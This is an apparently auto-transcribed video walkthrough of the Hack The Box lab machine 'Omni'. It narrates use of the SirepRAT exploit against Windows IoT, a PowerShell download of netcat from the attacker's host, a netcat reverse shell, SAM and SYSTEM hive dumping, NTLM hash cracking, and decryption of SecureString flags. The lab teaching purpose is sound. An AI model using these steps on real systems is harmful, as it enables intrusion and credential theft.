 what's going on youtube is ipsec we're doing omni from hack the box and i really like this box because it puts a lot of emphasis up front on recon because if you can't identify the os that it's running which is windows iot you're not going to really get anywhere on the box and nmap won't really just tell you hey this is windows iot and even though it's windows there's no 445 so you can't use crack map exec or something like that to identify the flavor of windows once you identify it is windows iot there is an exploit for it called cyrep rat which is much like oh 8067 or a tonal blue you just run it and you can execute commands on the box as system so you're a complete administrator on the box but there's something preventing you from reading the flags it is the flags being encrypted and a powershell secure string so you have to figure out how to get access to each user so you can decrypt the flags with all that being said let's just jump in as always begin with it and map so dash sc for default scripts sv enumerate versions oh a output all formats and we have to create that nmap directory and then the box name which is omni the ip address which is 10 10 10 204 i believe i hope it's 204 not 205 but i'm also going to add the dash v flag so it shows me open ports as it finds them and it looks like the host is offline so maybe it's to revive let's ping that address it pings oh um i didn't run this as pseudo so by default nmap uses uh like raw sockets to send ping request which means um it needs root if it doesn't then the ping is going to fail if ping fails the other two options for whose discovery is port 80 and port 443 i think it sends a syn packet on 443 and act packing on 80 but if those two ports are down and it can't ping the host or nmap's not ran as root it's going to say the box is down so we know 80 and 443 aren't up and it looks like we have port 135 and port 8080 so i'm going to take a look at 8080. so 101010 204 8080 and it looks like we get some type of login request i'm going to try admin admin admin password guest and nothing really works um let's look at the actual nmap and while that nmap runs i'm going to do dash p dash to do all ports since we don't really have that many so let's do nmap omni dot nmap so we just have two things so we have windows rpc on 135 and then microsoft iis on port 8080. um i'm used to seeing some type of iis version in windows and i don't see that like um 7.0 7.5 8 10 so i don't see that i think that would be in this http server header which we're just getting http api so um yeah we don't really have that much we know the box is windows and we can further know it as windows by doing a ping so if i ping uh 10 10 10 204 we notice the ttl is 127. um the ttl gets decremented by one every time it hits a router which in this case is openvpn so it started at 128. um if this was linux it would be 64. or if we ping localhost from linux we could see the ttl at 64. we don't have a router so that's why it did not decrement we have a few high number ports port 29820 and 29 819 so i'm going to google what this is support this uh we get cyrep rat which is a tool against windows iot core so there's a big presentation there um we have windows remoting open 59.85 the other thing we can do is search this banner header this windows device portal so if i grab this oops not paste copy and then google this we can also see what is this configure device remotely it is a windows iot thing so based upon that host header and this port going to a iot presentation i'm going to assume this is a windows iot box so there was a talk on black hat so if we google exploit windows iot uh well we got that let's see black hat this is a good talk to watch or read the white paper uh there is a default password so administrator and then the password of this that we can try so we can try logging in to see if they left the default and it does not look like they have we have an authorized authorization required i put a bad password okay yeah so nothing works um we can go and look at this tool so i recommend i guess watching this talk the cyrep rat talk because i don't know exactly how this works maybe one day i'll take it apart but we can just try using it so let's go to a new pane get clone on this and then python 3 on this and it looks like it does work if it doesn't you can always do like pip 3 install our requirements dot text to install any dependencies that this may have so let's just run the tool with the dash h flag to see what we have um what i'm going to do is run this get file from device um i'm going to do launch command with output instead of that so let's do this 10 10 10 204 launch command with output and maybe remote path on host name copy paste so it's cmd so it's running um let's do a v uh maybe dash dash v so i just did the verbose and we get some type of error put that in quotes it's not what i'm expecting so i'm probably gonna do a dash h again and see what options this launch command with output has um i'm gonna try cmd.exe c to see if maybe if we put a command prompt in front of it and that does not work at all so we got two different types of output and we also have this h result so i'm going to google windows error codes and let's see if we just search this what is this error not extra what error code this is um let's do hex to decimal convert that's not what i wanted to figure out exactly what error code this is 0x3 let's go one thousands i'm not sure that's probably not a windows error code so let's try running h again see what else we have um let's just get file from device so let's go back and do that since this is in the help output i'm guessing this is one of the more tested commands 10 10 10 204 that's not working there is a um origin output so let's try that dash dash return underscore output and let this run let's add the dash dash v flag for reverse and still nothing i'm going to try my launch command with output oh um i think we need to put this in quotes i'm not doing launch command with output but um earlier when i did this in quotes we got the like lines like this and when i did it without quotes i didn't get that so always notice the differences when you run commands and the output is slightly different even if it's not the output you want i mean it's different output you went down a different chain so it's very important to be able to pick those up and i see this starts with mz so this is the mz header of a binary so we're able to hit that i'm going to go back to my launch command with output and i'm going to do cmd there we go and let's do return underscore output and see what we get we have this in single quotes not double quotes so maybe i should do doubles i don't think that matters i also got rid of the cmd.exe so now we have ran um hostname and returndomni so now we have a way to run commands on this box so the next thing i want to do is see if we can get powershell running so i'm gonna do powershell and we may have to type it correctly and if this doesn't work i'm gonna specify the full path of powershell and we're going to guess um i think it's c colon windows is it in system 30 let's see is it windows power shell v 1.0 let's see when does powershell path i know it's like windows uh windows powershell version bin i believe so let's see winder powershell.exe where is powershell exe located okay v1 system32 windows powershell v1 okay let's see colon windows system 32 powershell powershot.exe so this returns omni then we know we can run powershell if it doesn't um i don't know exactly where we go let's see just run hostname c colon windows i have return output is there a bin directory this website didn't have been but i want to say most things are in bin directories so i'm going to pause the video real quick go back to my host machine which is windows and just make sure this is where powershell actually is so give me one second okay so i've confirmed this is the path for powershell as long as i spelled powershell correctly it is i'm just going to do hostname instead of hostname.exe and we're not really getting anything i wonder if we see colon windows system32 cmd.exe c and i'm just gonna do first name and we don't really get anything i wonder if is this no it can't be that slash c see what options do we have cyrup rat 10 10 10 204 h uh we can put file on device so if i upload nat cat uh that'll probably be good so put file on device h i was hoping it would show how to do this oh um there's an args so that's probably what we're doing wrong so cmd let's go back to powershell powershell.exe args who am i well we got the three lines it's a different return uh hostname the return i'm saying h result is zero so that's slightly different maybe if we use cmd.exe so c colon windows system32 cmd exe args c host name okay so now we have a way to do slash c can i do powershell now powershell first name and now we can run powershell commands so let's do iex to try to download a file um let's do nclvnp 8000 and i just did that so i have something listening on a thousand so i know when this command worked this is windows iot which is like a stripped down version of windows i don't even know if iex is gonna work so i'm going to do echo ix new object net.web client download string http 1010 14 2 port 8000 and we need to put this in single quotes okay and then we need to i convert to utf 16 little endian and all that did if i run this before it and then run xxd after it just changed the formatting and this is the formatting windows expects when you base 64 something base64 so now i can do the encoded command option in powershell and we can see if this works send this and nothing works and the reason why i was doing a powershell encoded command there was because that iex command i mean i have parentheses i have dashes i have single quotes there's a lot of special characters so that kind of just minimizes that i'll try w get see if it has that it does not let's try invoke web request iwr uri file i think 10 10 14 2 8 000 let's see cmd slash c wonder if i want to put this in quotes it may not be uri file may just be uri let's see powershell invoke web request see what this says dash ur i url one of it doesn't have invoke web request there we go um i'm gonna make sure it didn't hit i just didn't notice yeah so oh there it goes so i think it's just slow this iowr did that work was i just not looking at my neck at command yeah so um that works that's awesome so now we can download a file and i'm going to grab netcat so nc64.exe and before i run that one of these gonna say um i don't want to get rid of all that ergs d-i-r c-colon backslash is that gonna work um maybe backslash is a bad one sql slash invalid switch see program files data windows i don't see program files um like i only see one i don't see an x86 so i'm going to guess this is see windows iot 32-bit i think there's only a 64-bit windows iot and that's why we don't see two um yeah i'm pretty sure there's only 64-bit windows iot so i'm going to download this and we'll see if nc64.exe works in a normal environment with normal windows you'd be doing this to see if there's two program files and if it's 62 or 34-bit or 64 or 32-bit i've somehow made that backwards but um and today's age i mean it's almost always always always going to be 64-bit you rarely see 32-bits anymore so that part of recon is kind of dead um let's go make dir dub dub dub go n-w-dub and i wanna run let's see uh cmd who am i not a recognized command um that's it echo username is that right okay so it's just one print uh percent and we are omni dollar so we are the system user um essentially admin on this box so move nt authority system would be what you're probably used to saying so move downloads nc64.exe here and then we can start up a web server so python3 dash m http.server 8000 and launch this command again and we want to do this invoke web request uri 1010142 nc64.exe and dash out file is going to be just c colon nc64.exe what if i need to do two backslashes so if i can't run netcat i'm going to try two backslashes after that um don't know if that ran we'll try it nclvmp 9001 and we can go back here c colon nc dot exe 10 10 14 2 9 0001 uh not recognize command nc64.exe and we get a connection so now let's do a dash e powershell e powershell do a dir and we have a shell um we can go up a few directories uh who am i is not going to tell us who we are because the binary doesn't exist on this box but we could again do how we did it in um bash i think let's see if this works i don't know if it does it doesn't um in powershell you have this env directory and that's going to be all your environment variables and we can see user names probably going to be one of them yeah right here if you wanted to specify you could probably just do um gc for get content and username uh gc dollar and username i cannot find path echo and username there we go so that's how you can do it you can just do echo or the correct way would be right host in powershell so that's how you can view all these um things there is this data directory which is unique so a user profile is c colon data users system but if we just did dir we do see a users directory and this users just has public and there's nothing really in public so let's go into the data and we can see there's another like windows install windows test system data programs what not but if i go to windows oh if i go to users that's what i wanted we can see administrator app um so if i go into administrator administrator and we try to get root.text we see the length of root.text which is the size is pretty big and then it's just a secure string in powershell which is encrypted with like the user's credentials if we go into the app we have pretty much the same thing uh this user.txt is pretty big and it's secure string if we look at hardening text type did i paste it uh it's denied so we could run like some type of cackle to take this file over to be able to read it or we can just get into the user because i don't think this is um encrypted forget what the command is to see if it's um encrypted i think it was cipher and cypher's not recognized so maybe windows iot doesn't have it we can look at this admin xml and we have that so in order to decrypt this i'm guessing we have to become the app user and we are the system user on the box so uh as a system user we can dump the sam which is where windows stores all the credentials so if i go to cd windows um i think it's system32 config these are all the registry hives so h key local machinist system uh users what not the two we need is system and sam uh do you think security but the encryption key for the sam is actually in the system so can we just copy system out of this no because it has a write block so we have to save it so i think reg save hkl um what is it we'll just try m for hkey local machine and then system and this will be c colon window that let's do system there we go and we can do reg save h k l m h key local machine and we wanted the same now we've got to get these files back to a box so let's go kill this web server and i'm going to make dir um smb and then i'm going to do impact smb server and the reason why i'm not using the cyrep rap program to do this i guess we can try it um if i remember correctly this doesn't really output well so let's go where this is we can do dash h and we can say get file from device remote path c colon sam it just let's see return output see if it's going to do it put it in quotes maybe shoot it doesn't give the whole file this is not the whole sam file we look at system maybe it is yeah it's not giving the whole file um that's why i don't want to do it that way so let's go back into smb and packet smb server the share name will be please subscribe and the directory is just going to be my current working directory and i need to run this in sudo because in packet doesn't have permission to bind to port 445 so we can just go and now copy sam to 10 10 14 2. please subscribe test uh it requires smb2 or higher so we can do dash smb2 support and try copying this again and it looks like it is copying maybe did a lot of authentications and we got an error message smb so no file got created so at this point i'm going to switch away from impact because something's obviously broken and i'm just going to edit smb so samba smbd.com or smb.com and i'm going to take that and we are going to create a new share so the share is going to be called please subscribe and the comment is just going to be file drop and the reason why i don't default to this is because i always somehow manage to um forget that i'm running this smb server and then it's like vulnerability so when possible i always like running um web servers out of my terminal instead of editing an actual service so home ipsec htb omni smb browsable yes read only no guessed okay yes okay systemctl reload smbd i'm not active it samba or something pseudo service service smb 3d okay now that's restarted so i should be able to copy this now instead of copying it to test i'm going to copy it to sam access is denied so chmod 777 omni because not omni smb what happened there is anonymous user does not have the ability to write to that directory so now we have the sam i'm going to copy system to 10 10 14 2. please subscribe and now with these two files we can run a secret stump so unpack it again secret stump h [Music] i think it's system and dash sam yeah you give these hives so dash system sam and then specify the target and since this is local and we're doing files the target is going to be local and we have a few hashes so let's go and um copy these to a file the hashes i'm not going to do this in this directory and while i'm at it sudo vi etsy samba smb.com delete that sudo service smbd restart there we go so v hashes paste and if we cat hashes um aad so this format is username user id lan man hash and then ntlm hash which is new technology lan man so aad means it's blank and uh 31d6 means it's blank for ntlm so we don't need those i'm going to do awk dash f print the very first one colon the fourth column and now we just have username and hash the h to hashes and we can go over to our kraken so sh kraken and then v or go into hash cat v hashes um we'll call this omni and then we will paste and then we can run hash cat dash m i want to say it's 1 000 for ntlm users and then hashes omni opt word list rock you it's dash dash user not users and if this doesn't error we'll know 1000 is correct and it looks like it is it cracked one of them if we go up we can see cracked mesh 5143 and why i love doing the user flag because with that now we can just do dash dash shell and it shows us everything a cracked app this e3 and it's mesh5143 so with this um we can probably log into the website and the reason why i'm going straight to the website is in most cases i would be doing like a ps exec with a windows hash however the smb service isn't listening that is port 445. we could potentially do windows remoting do i have evil winrm on this so dash u is going to be was the username um app and then dash p mesh i think dash i 10 10 10 204 i think that's the syntax for this we'll see if this works and while that goes i'm just going to do it this way as well app paste the password and we can log in so we got like a file explorer but we already could view files um under processes there is run command if i run dir we got that we can do echo username and it's only one percent and we are app we run as default account we are default account but we definitely want to be app and if i do d-i-r-c colon backslash we do have nc64.exe so we can easily just run c colon nc64.exe e power shell 10 10 14 2 port 9001 and it's not a colon it's just a space um an aero parse header okay so let's do nc lvmp 9001 and i guess it's worth mentioning there's a reuse address or reuse socket and linux's kernel and if programs support it you can listen on the same port with multiple things and how it works is once the connection is made it moves to an ephemeral port so we see we can't listen on 9001 because we're listening here but um ss lnpt grep 9001 we can see we are listening so i'm going to run this command to get this netcat session and if i run this we're no longer listening it moved to an ephemeral port and does some type of magic routing so by doing netcat again i can open up yet another netcat but now we are the app user so if i do um and was it username we are app so we can go into data users app and we should be able to read this user.txt um i think it's we'll say secure string is import cli xml path user.txt and then ss dot i think it's get network credential and we wanted the flag i think let's see type user.txt uh password so username is flag we want password so git network cadential dot password and this is the flag so there is this iot.xml so we can do the same exact thing so path iot admin xml and let's type this out iot admin we want password because that is for omni administrator so where is get network cadential right here do this again and we get the password for this internet of things so now we can go back into the web interface and where is logout i wonder if i just go this log out let's do new private window administrator paste it and then let's go processes run command c colon nc64.exe um dash e powershell 1010142 9001 run the command get the shell uh it's in data users administrator and if we type root.text same exact thing as before so let's do the same exact thing import cli xml root.text and let's see there it is and there's the root flag so if you didn't really know how to do this google is always your friend so after you google something 500 times like the python simple http server http server i've googled that thousands of times eventually it just becomes muscle memory but decrypt secure string network credential and you can see this will probably say exactly what i did with decrypting the network credential so that is the box hope you guys enjoyed it take care and we'll see you all next week